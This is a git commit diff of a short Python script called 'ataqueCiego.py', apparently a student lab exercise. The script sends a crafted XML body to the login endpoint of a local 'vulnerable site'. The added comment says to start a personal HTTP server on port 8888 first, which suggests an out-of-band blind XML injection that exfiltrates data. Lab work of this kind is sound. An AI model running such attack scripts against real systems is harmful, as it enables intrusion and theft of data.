54a9ed74b02796c84cbb0f76fe01a9dde7afdfb0
Abraham <abraham.ramirezmor@uanl.edu.mx>
2024-05-18 05:02:34 -0600

    final

--- ataqueCiego.py
+++ ataqueCiego.py
@@ -1,6 +1,8 @@
 # pip install requests
 import requests
 
+# Primero se inicia servidor personal con python -m http.server 8888
+
 sitio_vulnerable = "http://127.0.0.1:8000"
 headers = {'Content-Type': 'application/xml'}
 request_body = \
@@ -12,3 +14,4 @@ request_body = \
 </datosSesion>
 """
 response = requests.post(f"{sitio_vulnerable}/login", headers=headers, data=request_body)
+print(response.content)
